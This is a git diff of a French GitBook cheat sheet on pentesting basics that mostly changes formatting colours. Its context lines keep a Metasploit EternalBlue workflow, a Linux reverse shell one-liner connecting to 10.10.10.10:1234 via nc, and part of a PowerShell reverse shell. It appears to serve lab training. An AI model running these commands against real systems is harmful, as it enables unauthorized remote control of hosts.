@@ -1,6 +1,23 @@
 ---
 cover: .gitbook/assets/cyber2.jpg
-coverY: 0
+coverY: 173.26359832635984
+layout:
+  width: default
+  cover:
+    visible: true
+    size: full
+  title:
+    visible: true
+  description:
+    visible: true
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
+  metadata:
+    visible: true
 ---
 
 # Basics
@@ -87,7 +104,7 @@ nmap -p 80 --script http-vuln-cve2019-19781 <adresse_IP>
 
 > <mark style="color:orange;">**Une bannière est une réponse envoyée par un service lorsqu'une connexion est établie avec lui.**</mark> Cette réponse peut contenir des informations sur le service lui-même, telles que sa version ou son nom, ce qui peut être utile pour identifier rapidement un service. La technique consistant à récupérer ces bannières est appelée "banner grabbing".
 
-<mark style="color:orange;">**Outils**</mark>**&#x20;**<mark style="color:purple;">**:**</mark>
+<mark style="color:orange;">**Outils**</mark>&#x20;
 
 * **Nmap :** `nmap -sV --script=banner <target>`
 *   **Netcat (nc) :**
@@ -380,19 +397,19 @@ Une fois les services identifiés via un scan Nmap, la première étape consiste
 
 ### <mark style="color:blue;">**2. Outil**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**`searchsploit`**</mark>
 
-**Installation :**
+<mark style="color:green;">**Installation :**</mark>
 
 ```bash
 sudo apt install exploitdb -y
 ```
 
-**Recherche d'Exploits :**
+<mark style="color:green;">**Recherche d'Exploits :**</mark>
 
 ```bash
 searchsploit <nom_application>
 ```
 
-**Exemple :**
+<mark style="color:green;">**Exemple :**</mark>
 
 ```bash
 searchsploit openssh 7.2
@@ -404,7 +421,7 @@ Cela affiche une liste d'exploits disponibles pour `OpenSSH 7.2`.
 
 ### <mark style="color:blue;">**3. Bases de Données en Ligne**</mark>
 
-**Sources recommandées :**
+<mark style="color:green;">**Sources recommandées :**</mark>
 
 * **Exploit DB** : Base de données des exploits publics.
 * **Rapid7 DB** : Base de données de vulnérabilités.
@@ -414,19 +431,19 @@ Cela affiche une liste d'exploits disponibles pour `OpenSSH 7.2`.
 
 ### <mark style="color:blue;">**4. Framework Metasploit**</mark>
 
-**Lancer Metasploit :**
+<mark style="color:green;">**Lancer Metasploit :**</mark>
 
 ```bash
 msfconsole
 ```
 
-**Recherche d'Exploit :**
+<mark style="color:green;">**Recherche d'Exploit :**</mark>
 
 ```bash
 search exploit <vulnérabilité>
 ```
 
-**Exemple :**
+<mark style="color:green;">**Exemple :**</mark>
 
 ```bash
 search exploit eternalblue
@@ -438,39 +455,39 @@ Cela retourne les modules Metasploit correspondants à la vulnérabilité `Etern
 
 ### <mark style="color:blue;">**5. Utilisation d'un Exploit avec Metasploit**</mark>
 
-<mark style="color:yellow;">**Charger un Module d'Exploit :**</mark>
+<mark style="color:green;">**Charger un Module d'Exploit :**</mark>
 
 ```bash
 use <nom_complet_du_module>
 ```
 
-**Exemple :**
+<mark style="color:green;">**Exemple :**</mark>
 
 ```bash
 use exploit/windows/smb/ms17_010_psexec
 ```
 
-<mark style="color:yellow;">**Configurer les Options :**</mark>
+<mark style="color:green;">**Configurer les Options :**</mark>
 
 ```bash
 show options
 set <nom_option> <valeur>
 ```
 
-**Exemple :**
+<mark style="color:green;">**Exemple :**</mark>
 
 ```bash
 set RHOSTS 10.10.10.40
 set LHOST tun0
 ```
 
-<mark style="color:yellow;">**Vérifier la Vulnérabilité :**</mark>
+<mark style="color:green;">**Vérifier la Vulnérabilité :**</mark>
 
 ```bash
 check
 ```
 
-<mark style="color:yellow;">**Lancer l'Exploit :**</mark>
+<mark style="color:green;">**Lancer l'Exploit :**</mark>
 
 ```bash
 exploit
@@ -503,7 +520,7 @@ meterpreter > shell
 
 **Le Reverse Shell** est une méthode rapide et courante pour obtenir le contrôle d'un hôte compromis.
 
-<mark style="color:orange;">**Étapes pour utiliser un Reverse Shell :**</mark>
+<mark style="color:green;">**Étapes pour utiliser un Reverse Shell :**</mark>
 
 1.  **Lancer un écouteur Netcat :**
 
@@ -522,7 +539,7 @@ meterpreter > shell
     ip a
     ```
 3. **Commande de Reverse Shell :**
-   *   **Linux (bash) :**
+   *   <mark style="color:orange;">**Linux (bash) :**</mark>
 
        {% code title="COMMANDE LINUX" overflow="wrap" lineNumbers="true" fullWidth="true" %}
        ```bash
@@ -530,7 +547,7 @@ meterpreter > shell
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
        ```
        {% endcode %}
-   *   **Windows (Powershell)**&#x20;
+   *   <mark style="color:orange;">**Windows (Powershell)**</mark>&#x20;
 
        {% code overflow="wrap" lineNumbers="true" %}
        ```powershell
@@ -617,7 +634,7 @@ $client.Close();
 
 **Le Bind Shell** attend que nous nous y connections.
 
-<mark style="color:orange;">**Étapes pour utiliser un Bind Shell :**</mark>
+<mark style="color:green;">**Étapes pour utiliser un Bind Shell :**</mark>
 
 1. **Commande de Bind Shell :**
    *   **Linux (bash)**&#x20;
@@ -686,24 +703,24 @@ $client.Close();
 * **Définition** : Un terminal est une interface pour la communication avec l'ordinateur. Historiquement, il s'agissait de dispositifs physiques avec un écran et un clavier. Aujourd'hui, ce sont principalement des émulateurs de terminal qui fonctionnent sur des systèmes d'exploitation graphiques.
 * **Usage** : Il permet à l'utilisateur d'interagir avec le système d'exploitation en tapant des commandes.
 
-#### <mark style="color:orange;">TTY</mark>
+<mark style="color:orange;">**TTY**</mark>
 
 * **Définition** : TTY signifie "teletypewriter" (téléimprimeur). Dans Unix/Linux, il fait référence à un périphérique qui gère les connexions de terminal, que ce soit physique ou virtuel.
 * **Usage** : Il représente un canal de communication entre le terminal (ou un émulateur de terminal) et le système d'exploitation. Chaque terminal ouvert ou chaque session SSH est associé à un TTY.
 
-#### <mark style="color:orange;">Shell</mark>
+<mark style="color:orange;">**Shell**</mark>
 
 * **Définition** : Un shell est un interpréteur de commandes qui permet à l'utilisateur d'exécuter des commandes sur le système d'exploitation. Des exemples courants incluent bash, zsh, sh, etc.
 * **Usage** : Il interprète les commandes tapées par l'utilisateur et les exécute. Il fournit également des fonctionnalités comme des scripts pour automatiser les tâches.
 
-#### <mark style="color:orange;">Console</mark>
+<mark style="color:orange;">**Console**</mark>
 
 * **Définition** : Une console est souvent utilisée de manière interchangeable avec un terminal, mais dans le contexte Unix/Linux, elle fait souvent référence à l'interface principale de saisie/sortie du système. C'est le dispositif où les messages de démarrage et les journaux système sont envoyés.
 * **Usage** : Après le démarrage, la console peut devenir un terminal où des sessions interactives peuvent avoir lieu.
 
 ***
 
-#### <mark style="color:orange;">En Résumé</mark>
+<mark style="color:orange;">**En Résumé**</mark>
 
 * **Terminal** : Interface utilisateur pour taper des commandes (physique ou émulateur).
 * **TTY** : Dispositif Unix/Linux pour gérer les connexions de terminal.
@@ -718,11 +735,11 @@ $client.Close();
 Un Bind Shell est plus résilient qu'un Reverse Shell pour les reconnections.
 
 {% hint style="info" %}
-<mark style="color:orange;">**Upgrading TTY**</mark>
+<mark style="color:green;">**Upgrading TTY**</mark>
 
 Lorsqu'on se connecte à un shell via Netcat, nous avons accès à un shell limité où nous pouvons taper des commandes et utiliser la touche retour arrière, mais nous ne pouvons pas déplacer le curseur de texte pour éditer les commandes ni accéder à l'historique des commandes. Pour surmonter ces limitations et obtenir une expérience de shell plus complète (comme celle fournie par SSH), nous devons "upgrader" notre TTY (teletypewriter).
 
-**Étapes pour Améliorer le TTY**
+<mark style="color:green;">**Étapes pour Améliorer le TTY**</mark>
 
 1. **Utilisation de Python pour générer un shell interactif complet**
    *   Dans notre shell Netcat, nous utilisons Python pour lancer un shell interactif :
@@ -911,7 +928,7 @@ Lorsqu'on se connecte à un shell via Netcat, nous avons accès à un shell limi
 * <mark style="color:green;">**Outils**</mark> :
   * **GTFOBins** : Liste de commandes exploitables avec sudo.
   * **LOLBAS** : Liste d'applications Windows exploitables.
-* **Références** :
+* <mark style="color:green;">**Références**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark>
   * [HackTricks Linux Privesc Checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
 
 ***
